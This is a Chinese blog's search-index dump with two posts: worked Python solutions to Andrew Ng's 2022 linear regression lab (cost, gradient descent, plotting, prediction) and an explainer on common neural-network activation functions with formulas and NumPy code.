","date":"2022-07-10","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:2:4","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-课程1Week2-线性回归","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"实现代价函数 复习代价函数： 根据上面的公式，我们可以补充代码如下： def compute_cost(x, y, w, b): \"\"\" 计算线性回归的代价函数 Args: x (ndarray): Shape (m,) Input to the model (Population of cities) y (ndarray): Shape (m,) Label (Actual profits for the cities) w, b (scalar): Parameters of the model Returns total_cost (float): The cost of using w,b as the parameters for linear regression to fit the data points in x and y \"\"\" # 训练集的个数 m = x.shape[0] # You need to return this variable correctly total_cost = 0 ### START CODE HERE ### cost_sum = 0 for i in range(m): f_wb_i = w * x[i] + b cost_i = (f_wb_i - y[i]) ** 2 cost_sum += cost_i total_cost = (1 / (2 * m)) * cost_sum ### END CODE HERE ### return total_cost 进行测试： # 执行代价函数 # Compute cost with some initial values for paramaters w, b initial_w = 2 initial_b = 1 cost = compute_cost(x_train, y_train, initial_w, initial_b) print(type(cost)) print(f'Cost at initial w (zeros): {cost:.3f}') # 调用测试：Public tests(原先代码写好的测试方法，用来测试我们的结果的) compute_cost_test(compute_cost) ","date":"2022-07-10","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:2:5","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-课程1Week2-线性回归","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"梯度下降 梯度 复习： def compute_gradient(x, y, w, b): \"\"\" 计算线性回归的梯度(也就是两个偏导数) Args: x (ndarray): Shape (m,) Input to the model (Population of cities) y (ndarray): Shape (m,) Label (Actual profits for the cities) w, b (scalar): Parameters of the model Returns dj_dw (scalar): The gradient of the cost w.r.t. the parameters w dj_db (scalar): The gradient of the cost w.r.t. the parameter b \"\"\" # Number of training examples m = x.shape[0] # You need to return the following variables correctly dj_dw = 0 # 两个偏导数 dj_db = 0 ### START CODE HERE ### for i in range(m): f_wb = w * x[i] + b # 线性回归模型 dj_dw_i = (f_wb - y[i]) * x[i] # f中对w的偏导 dj_db_i = f_wb - y[i] # f中对b的偏导 dj_db += dj_db_i dj_dw += dj_dw_i dj_dw = dj_dw / m dj_db = dj_db / m ### END CODE HERE ### return dj_dw, dj_db 测试： # Compute and display cost and gradient with non-zero w test_w = 0.2 test_b = 0.2 tmp_dj_dw, tmp_dj_db = compute_gradient(x_train, y_train, test_w, test_b) print('Gradient at test w, b:', tmp_dj_dw, tmp_dj_db) 梯度下降 def gradient_descent(x, y, w_in, b_in, cost_function, gradient_function, alpha, num_iters): \"\"\" 梯度下降的过程 Performs batch gradient descent to learn theta. Updates theta by taking num_iters gradient steps with learning rate alpha Args: x : (ndarray): Shape (m,) y : (ndarray): Shape (m,) w_in, b_in : (scalar) Initial values of parameters of the model cost_function: function to compute cost gradient_function: function to compute the gradient alpha : (float) Learning rate num_iters : (int) number of iterations to run gradient descent Returns w : (ndarray): Shape (1,) Updated values of parameters of the model after running gradient descent b : (scalar) Updated value of parameter of the model after running gradient descent \"\"\" # number of training examples m = len(x) # An array to store cost J and w's at each iteration — primarily for graphing later J_history = [] w_history = [] w = copy.deepcopy(w_in) # avoid modifying global w within function b = b_in for i in range(num_iters): # Calculate the gradient and update the parameters dj_dw, dj_db = gradient_function(x, y, w, b) # 调用计算梯度的方法 # Update Parameters using w, b, alpha and gradient(同时更新) w = w - alpha * dj_dw b = b - alpha * dj_db # Save cost J at each iteration if i \u003c 100000: # prevent resource exhaustion cost = cost_function(x, y, w, b) # 计算代价 J_history.append(cost) # Print cost every at intervals 10 times or as many iterations if \u003c 10 if i % math.ceil(num_iters / 10) == 0: w_history.append(w) print(f\"Iteration {i:4}: Cost {float(J_history[-1]):8.2f} \") return w, b, J_history, w_history # return w and J,w history for graphing initial_w = 0. initial_b = 0. # some gradient descent settings iterations = 1500 alpha = 0.01 w, b, _, _ = gradient_descent(x_train, y_train, initial_w, initial_b, compute_cost, compute_gradient, alpha, iterations) print(\"w,b found by gradient descent:\", w, b) ","date":"2022-07-10","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:2:6","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-课程1Week2-线性回归","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"画出图像 def draw_plot(w, b): \"\"\" 画出图像 :param w: :param b: :return: \"\"\" m = x_train.shape[0] predicted = np.zeros(m) for i in range(m): predicted[i] = w * x_train[i] + b # 计算出预测值 # Plot the linear fit plt.plot(x_train, predicted, c=\"b\") # Create a scatter plot of the data. plt.scatter(x_train, y_train, marker='x', c='r') # Set the title plt.title(\"Profits vs. Population per city\") # Set the y-axis label plt.ylabel('Profit in $10,000') # Set the x-axis label plt.xlabel('Population of City in 10,000s') plt.show() 可以看到最终的w和b可以用来进行预测 下面让我们预测 areas of 35,000 and 70,000 people上的利润： predict1 = 3.5 * w + b print('For population = 35,000, we predict a profit of $%.2f' % (predict1*10000)) predict2 = 7.0 * w + b print('For population = 70,000, we predict a profit of $%.2f' % (predict2*10000)) ","date":"2022-07-10","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:2:7","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-课程1Week2-线性回归","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"完整代码 \"\"\" 目标：In this lab, you will implement linear regression with one variable to predict profits for a restaurant franchise. 问题陈述： 假设你是餐厅CEO，想要在不同城市开分店 想要把业务拓展到更高利润的城市 连锁店已经在各个城市开设了餐厅，并且你拥有来自城市的利润和人口数据 你还有餐厅候选城市的数据 \"\"\" # 导包 import numpy as np import matplotlib.pyplot as plt import copy import math from utils import * from public_tests import * def cat_data(): \"\"\" 查看数据维度和形式等 \"\"\" print(\"x_data数据类型：\", type(x_train)) # \u003cclass 'numpy.ndarray'\u003e print(\"y_data数据类型：\", type(y_train)) # \u003cclass 'numpy.ndarray'\u003e # 查看数据的维度 print(\"x_data的shape:\", x_train.shape) print(\"x_data的维度:\", x_train.ndim) print(\"数据集个数(m):\", len(x_train)) # 可视化数据 plt.scatter(x_train, y_train, marker='x', c='r') plt.title(\"Profits vs. Population per city\") plt.ylabel('Profit in $10000') plt.xlabel('Population of City in 10000') plt.show() # 我们的目标就是建立线性回归model来fit这个data def compute_cost(x, y, w, b): \"\"\" 计算线性回归的代价函数 Args: x (ndarray): Shape (m,) Input to the model (Population of cities) y (ndarray): Shape (m,) Label (Actual profits for the cities) w, b (scalar): Parameters of the model Returns total_cost (float): The cost of using w,b as the parameters for linear regression to fit the data points in x and y \"\"\" # 训练集的个数 m = x.shape[0] # You need to return this variable correctly total_cost = 0 ### START CODE HERE ### cost_sum = 0 for i in range(m): f_wb_i = w * x[i] + b cost_i = (f_wb_i - y[i]) ** 2 cost_sum += cost_i total_cost = (1 / (2 * m)) * cost_sum ### END CODE HERE ### return total_cost def compute_gradient(x, y, w, b): \"\"\" 计算线性回归的梯度(也就是两个偏导数) Args: x (ndarray): Shape (m,) Input to the model (Population of cities) y (ndarray): Shape (m,) Label (Actual profits for the cities) w, b (scalar): Parameters of the model Returns dj_dw (scalar): The gradient of the cost w.r.t. the parameters w dj_db (scalar): The gradient of the cost w.r.t. the parameter b \"\"\" # Number of training examples m = x.shape[0] # You need to return the following variables correctly dj_dw = 0 # 两个偏导数 dj_db = 0 ### START CODE HERE ### for i in range(m): f_wb = w * x[i] + b # 线性回归模型 dj_dw_i = (f_wb - y[i]) * x[i] # f中对w的偏导 dj_db_i = f_wb - y[i] # f中对b的偏导 dj_db += dj_db_i dj_dw += dj_dw_i dj_dw = dj_dw / m dj_db = dj_db / m ### END CODE HERE ### return dj_dw, dj_db def gradient_descent(x, y, w_in, b_in, cost_function, gradient_function, alpha, num_iters): \"\"\" 梯度下降的过程 Performs batch gradient descent to learn theta. Updates theta by taking num_iters gradient steps with learning rate alpha Args: x : (ndarray): Shape (m,) y : (ndarray): Shape (m,) w_in, b_in : (scalar) Initial values of parameters of the model cost_function: function to compute cost gradient_function: function to compute the gradient alpha : (float) Learning rate num_iters : (int) number of iterations to run gradient descent Returns w : (ndarray): Shape (1,) Updated values of parameters of the model after running gradient descent b : (scalar) Updated value of parameter of the model after running gradient descent \"\"\" # number of training examples m = len(x) # An array to store cost J and w's at each iteration — primarily for graphing later J_history = [] w_history = [] w = copy.deepcopy(w_in) # avoid modifying global w within function b = b_in for i in range(num_iters): # Calculate the gradient and update the parameters dj_dw, dj_db = gradient_function(x, y, w, b) # 调用计算梯度的方法 # Update Parameters using w, b, alpha and gradient(同时更新) w = w - alpha * dj_dw b = b - alpha * dj_db # Save cost J at each iteration if i \u003c 100000: # prevent resource exhaustion cost = cost_function(x, y, w, b) # 计算代价 J_history.append(cost) # Print cost every at intervals 10 times or as many iterations if \u003c 10 if i % math.ceil(num_iters / 10) == 0: w_history.append(w) print(f\"Iteration {i:4}: Cost {float(J_history[-1]):8.2f} \") return w, b, J_history, w_history # return w and J,w history for graphing def draw_plot(w, b): \"\"\" 画出图像 :param w: :param b: :return: \"\"\" m = x_train.shape[0] predicted = np.zeros(m) for i in range(m): predicted[i] = w * x_train[i] + b # 计算出预测","date":"2022-07-10","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:3:0","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-课程1Week2-线性回归","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"什么是激活函数(what) Nerual Network中的每个神经元节点接受上一层神经元的输出值作为本神经元的输入值，并将输入值传递给下一层，输入层神经元节点会将输入属性值直接传递给下一层（隐层或输出层）。 在多层神经网络中，上层节点的输出和下层节点的输入之间具有一个函数关系，这个函数称为激活函数（又称激励函数, active function）。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:1:0","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"激活函数的用途(why) 加入激活函数，深度神经网络才能具备分层的非线性映射学习能力。因此激活函数是神经网络不可或缺的一部分 如果不用激励函数（其实相当于激励函数是f(x) = x），在这种情况下你每一层节点的输入都是上层输出的线性函数，很容易验证，无论你神经网络有多少层，输出都是输入的线性组合，与没有隐藏层效果相当，这种情况就是最原始的感知机（Perceptron）了，那么网络的逼近能力就相当有限。 正因为上面的原因，我们决定引入非线性函数作为激励函数，这样深层神经网络表达能力就更加强大（不再是输入的线性组合，而是几乎可以逼近任意函数）。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:2:0","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"激活函数需要具备的性质 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:3:0","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"1.非线性 即导数不是常数。保证多层网络不退化成单层线性网络。这也是激活函数的意义所在。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:3:1","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"2.可微性(定义域内 存在导函数)： 可微性保证了在优化中梯度的可计算性。传统的激活函数如sigmoid等满足处处可微。对于分段线性函数比如ReLU，只满足几乎处处可微（即仅在有限个点处不可微）。对于SGD算法来说，由于几乎不可能收敛到梯度接近零的位置，有限的不可微点对于优化结果不会有很大影响。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:3:2","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"3.单调性(monotonic) 即导数符号不变。当激活函数是单调的时候，单层网络能够保证是凸函数。 更通俗的理解：函数形式是当我输入一个数值，通过计算得到一个数值，里面没有超级参数，也就是说我们在保证函数分布不发生改变的情况下，对神经元的数值带来一个非线性的映射。但是需要保证单调的原因是不改变分布的规律发生大的改变。当不是单调的时候我们可能会有很多个局部最优，不能保证是一个凸函数，对后面我们做梯度下降时带来巨大影响。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:3:3","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"4.计算简单 激活函数在神经网络前向的计算次数与神经元的个数成正比，因此简单的非线性函数自然更适合用作激活函数。这也是ReLU之流比其它使用Exp等操作的激活函数更受欢迎的其中一个原因。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:3:4","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"5.非饱和性(saturation) 饱和指的是在某些区间梯度接近于零（即梯度消失），使得参数无法继续更新的问题。最经典的例子是Sigmoid，它的导数在x为比较大的正值和比较小的负值时都会接近于0。更极端的例子是阶跃函数，由于它在几乎所有位置的梯度都为0，因此处处饱和，无法作为激活函数。ReLU在x\u003e0时导数恒为1，因此对于再大的正值也不会饱和。但同时对于x\u003c0，其梯度恒为0，这时候它也会出现饱和的现象。Leaky ReLU[3]和PReLU的提出正是为了解决这一问题。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:3:5","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"6.输出范围有限 有限的输出范围使得网络对于一些比较大的输入也会比较稳定，这也是为什么早期的激活函数都以此类函数为主，如Sigmoid、Tanh。但这导致了前面提到的梯度消失问题，而且强行让每一层的输出限制到固定范围会限制其表达能力。因此现在这类函数仅用于某些需要特定输出范围的场合，比如概率输出（此时loss函数中的log操作能够抵消其梯度消失的影响）、LSTM里的gate函数。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:3:6","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"7.接近恒等变换（identity） f(x)≈x，即约等于x。这样的好处是使得输出的幅值不会随着深度的增加而发生显著的增加，从而使网络更为稳定，同时梯度也能够更容易地回传。这个与非线性是有点矛盾的，因此激活函数基本只是部分满足这个条件。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:3:7","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"8.参数少 大部分激活函数都是没有参数的。像PReLU带单个参数会略微增加网络的大小。还有一个例外是Maxout，尽管本身没有参数，但在同样输出通道数下k路Maxout需要的输入通道数是其它函数的k倍，这意味着神经元数目也需要变为k倍；但如果不考虑维持输出通道数的情况下，该激活函数又能将参数个数减少为原来的k倍。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:3:8","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"9.归一化(normalization) 对应的激活函数是SELU，主要思想是使样本分布自动归一化到零均值、单位方差的分布，从而稳定训练。归一化的思想也被用于网络结构的设计，比如Batch Normalization。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:3:9","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"有哪些激活函数(which) 激活函数的发展经历了Sigmoid -\u003e Tanh -\u003e ReLU -\u003e Leaky ReLU -\u003e Maxout这样的过程，还有一个特殊的激活函数Softmax，因为它只会被用在网络中的最后一层，用来进行最后的分类和归一化。 如果按照饱和与否作为区分条件，表示如下图： ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:4:0","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"1.Sigmoid函数 最常用的非线性的激活函数 数学形式如下： $$ f(z) = \\frac{1}{1 + e^{-z}} $$ 导数是： $$ f^{’}(z) = f(z)(1-f(z)) $$ 图像如下： 特点： 它能够把输入的连续实值变换为0和1之间的输出，特别的，如果是非常大的负数，那么输出就是0；如果是非常大的正数，输出就是1 平滑、易求导。可以将函数映射到(0, 1)之间，通常二分类算法会在最后套一层sigmoid函数。 缺点： sigmoid函数曾经被使用的很多，不过近年来，用它的人越来越少了。主要是因为它固有的一些缺点: 缺点1：在深度神经网络中梯度反向传递时导致梯度爆炸和梯度消失，其中梯度爆炸发生的概率非常小，而梯度消失发生的概率比较大。首先来看Sigmoid函数的导数，如下图所示 如果我们初始化神经网络的权值为 [ 0 , 1 ] [0,1][0,1] 之间的随机值，由反向传播算法的数学推导可知，梯度从后向前传播时，每传递一层梯度值都会减小为原来的0.25倍，如果神经网络隐层特别多，那么梯度在穿过多层后将变得非常小接近于0，即出现梯度消失现象；当网络权值初始化为 ( 1 , + ∞ ) (1,+∞)(1,+∞) 区间内的值，则会出现梯度爆炸情况。 缺点2：Sigmoid函数的输出不是关于原点对称的。因为如果输入神经元的数据总是正数，那么关于w的梯度在反向传播的过程中，将会要么全部是正数，要么全部是负数，这将会导致梯度下降权重更新时出现z字型的下降。 缺点3：其解析式中含有幂运算，计算机求解时相对来讲比较耗时。对于规模比较大的深度网络，这会较大地增加训练时间。 用Python实现： def sigmoid(x): return 1 / (1 + np.exp(-x)) ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:4:1","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"2.tanh函数 数学式为: $$ \\tanh(x) = \\frac{e_x - e^{-x}}{e_x + e^{-x}} = 2f(2x) - 1 $$ 导数为： $$ \\tan h^{’}(x) = 4f(2x)(1-f(2x)) $$ tanh函数及其导数的几何图像如下图： 优点： 它解决了Sigmoid函数的不是zero-centered输出问题 输出是0均值 梯度取值范围在(0, 1)之间 缺点： 同sigmoid一样，然而，梯度消失（gradient vanishing）的问题和幂运算的问题仍然存在 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:4:2","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"3.Relu函数 数学式子： $$ f(x) = max(0,x) $$ Relu函数及其导数的图像如下图所示： ReLU是一种后来才出现的激活函数。从图中 可以看到，当x\u003c0时，出现硬饱和，当x\u003e0时，不存在饱和问题。因此，ReLU 能够在x\u003e0时保持梯度不衰减，从而缓解梯度消失问题。然而，随着训练的推进，部分输入会落入硬饱和区，导致对应权重无法更新，这种现象被称为“神经元死亡”。与sigmoid类似，ReLU的输出均值也大于0。偏移现象和神经元死亡会共同影响网络的收敛性。 产生激活函数大面积为被激活的原因是： 1、初始化的参数设置时，使Relu没有被激活。 2、学习率太高，神经元在一定范围内波动，可能会发生数据多样性的丢失，这种情况下神经元不会被激活，数据多样性的丢失不可逆。 ReLU函数其实就是一个取最大值函数，注意这并不是全区间可导的，但是我们可以取sub-gradient，如上图所示。ReLU虽然简单，但却是近几年的重要成果，有以下几大优点： 解决了gradient vanishing问题 (在正区间) 计算速度非常快，只需要判断输入是否大于0 收敛速度远快于sigmoid和tanh ReLU也有几个需要特别注意的问题： ReLU的输出不是zero-centered Dead ReLU Problem，指的是某些神经元可能永远不会被激活，导致相应的参数永远不能被更新。有两个主要原因可能导致这种情况产生: (1) 非常不幸的参数初始化，这种情况比较少见 (2) learning rate太高导致在训练过程中参数更新太大，不幸使网络进入这种状态。解决方法是可以采用Xavier初始化方法，以及避免将learning rate设置太大或使用adagrad等自动调节learning rate的算法。 尽管存在这两个问题，ReLU目前仍是最常用的activation function，在搭建人工神经网络的时候推荐优先尝试！ Python代码： def relu(x): return np.maximum(0, x) ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:4:3","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"4.Leaky ReLU函数(PReLU) PRelu函数： 形式同leaky relu，区别在于PRelu的$\\alpha$不是超参，而是学习出来的。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:4:4","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"5.ELU(Exponential Linear Units)函数 函数表达式： $$ f(x) = \\begin{cases} x, \u0026 if x\u003e0 \\ \\alpha(e^x-1), \u0026 其他情况 \\ \\end{cases} $$ 函数及其导数的图像如下图所示： ELU也是为解决ReLU存在的问题而提出， 优点： 收敛速度快 不会有Deal ReLU问题 输出的均值接近0，zero-centered 左侧软饱合能够让ELU对输入变化或噪声更鲁棒 它的一个小问题在于计算量稍大(包含指数)。类似于Leaky ReLU，理论上虽然好于ReLU，但在实际使用中目前并没有好的证据ELU总是优于ReLU。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:4:5","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"6.softPlus ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:4:6","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"7.大一统：Maxout函数 $$ f(x) = max(\\omega_1^Tx+b_1, \\omega_2^Tx+b_2, …,\\omega_n^Tx+b_n,) $$ 使用maxout的默认先验：样本集是凸集可分的 优点： Maxout具有ReLU的优点，如计算简单，不会 saturation饱和，同时又没有ReLU的一些缺点，如容易死掉。 缺点： 每个神经元的参数double，这就导致整体参数的数量激增，明显增加了计算量，使得应用maxout的层的参数个数成k倍增加，原本只需要1组就可以，采用maxout之后就需要k倍了。 ","date":"2022-07-01","objectID":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/:4:7","tags":["激活函数","深度学习入门","softmax","ReLU","Sigmoid"],"title":"常用激活函数","uri":"/%E5%B8%B8%E7%94%A8%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"},{"categories":["AI"],"content":"8.softmax $$ softmax(z_i) = \\frac{e^{z_i}}{\\sum_{j=1}^{n}{e^{z_i}}} $$ 值域0-1之间 通常用于多分类的输出，所有分类的输出之和为1 指数函数曲线呈现递增趋势，最重要的是斜率逐渐增大，也就是说在轴上一个很小的变化，可以导致y轴上很大的变化。经过使用指数形式的Softmax函数能够将差距大的数值距离拉的更大。但是这样也有可能会产生溢出。 使用Softmax函数作为输出层激活函数时，常使用交叉熵作损失函数。Softmax函数计算过程中，容易因为输出节点的输出值较大产生溢出现象，在计算交叉熵时也可能会产生溢出。为了计算的稳定性，TensorFlow提供了一个统一的接口，将Softmax与交叉熵损失函数同时实现，同时也处理了数值不稳定的异常，使用TensorFlow深度学习框架的时候，推荐使用这个统一的接口，避免分开使用Softmax函数与交叉熵损失函数。 Python实现softmax: # softmax函数(用于多元分类问题) def softmax(a): exp_a = np.exp(a) sum_exp_a = np.sum(exp_a) y = exp_a / sum_exp_a return y # softmax函数改良版 def softmaxV2(a): c = np.max(a) exp_a = np.exp(a - c) # 溢出对策 sum_exp_a = np.sum(exp_a) y = exp_a / sum_exp_a return y 